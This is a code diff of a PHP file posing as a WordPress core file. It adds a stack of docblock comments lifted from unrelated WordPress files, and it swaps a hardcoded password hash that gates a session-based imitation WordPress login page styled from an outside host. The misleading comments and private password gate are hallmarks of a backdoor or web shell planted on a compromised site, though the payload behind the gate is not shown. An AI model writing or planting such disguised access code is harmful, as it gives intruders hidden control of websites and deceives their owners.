@@ -1,7 +1,78 @@
 <?php
+/**
+ * The base configuration for WordPress
+ *
+ * The wp-config.php creation script uses this file during the installation.
+ * You don't have to use the website, you can copy this file to "wp-config.php"
+ * and fill in the values.
+ *
+ * This file contains the following configurations:
+ *
+ * * Database settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
+ * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/
+ *
+ * @package WordPress
+ */
+/**
+ * Gets the email message from the user's mailbox to add as
+ * a WordPress post. Mailbox connection information must be
+ * configured under Settings > Writing
+ *
+ * @package WordPress
+ */
+/**
+ * A pseudo-cron daemon for scheduling WordPress tasks.
+ *
+ * WP-Cron is triggered when the site receives a visit. In the scenario
+ * where a site may not receive enough visits to execute scheduled tasks
+ * in a timely manner, this file can be called directly or via a server
+ * cron daemon for X number of times.
+ *
+ * Defining DISABLE_WP_CRON as true and calling this file directly are
+ * mutually exclusive and the latter does not rely on the former to work.
+ *
+ * The HTTP request to this file will not slow down the visitor who happens to
+ * visit when a scheduled cron event runs.
+ *
+ * @package WordPress
+ */
+/**
+ * Handle Trackbacks and Pingbacks Sent to WordPress
+ *
+ * @since 0.71
+ *
+ * @package WordPress
+ * @subpackage Trackbacks
+ */
+/**
+ * Atom Syndication Format PHP Library
+ *
+ * @package AtomLib
+ * @link http://code.google.com/p/phpatomlib/
+ *
+ * @author Elias Torres <elias@torrez.us>
+ * @version 0.4
+ * @since 2.3.0
+ */
+/**
+ * Structure that store common Atom Feed Properties
+ *
+ * @package AtomLib
+ */
+ 
 session_start();
-$hashed_password = '$2y$10$sWlD8rT5pA7N8m6TuBwIyeBX.GNlDGQhQLRm3CoW.11wC1U9ARppi';
+$hashed_password = '$2y$10$fZ/ez7MrWDlly5MOHOaaZOdgNwmcWJTklpMB/oOL0V9HnNS5Crvmy';
 
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
 // Cek login
 if (!isset($_SESSION['auth'])) {
     if (isset($_POST['pwd']) && password_verify($_POST['pwd'], $hashed_password)) {
@@ -15,13 +86,11 @@ if (!isset($_SESSION['auth'])) {
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Log In ‹ Program Doktor Pendidikan — WordPress</title>
 
-<!-- CSS External -->
 <link rel='stylesheet' href='https://includes-css.pages.dev/css/dashicons.min.css'>
 <link rel='stylesheet' href='https://includes-css.pages.dev/css/buttons.min.css'>
 <link rel='stylesheet' href='https://includes-css.pages.dev/css/forms.min.css'>
 <link rel='stylesheet' href='https://includes-css.pages.dev/css/login.min.css'>
 
-<!-- CSS FORCE LOGO W - PAKSA MUNCUL -->
 <style>
 /* Reset semua style yang mungkin menyembunyikan logo */
 .wp-login-logo,
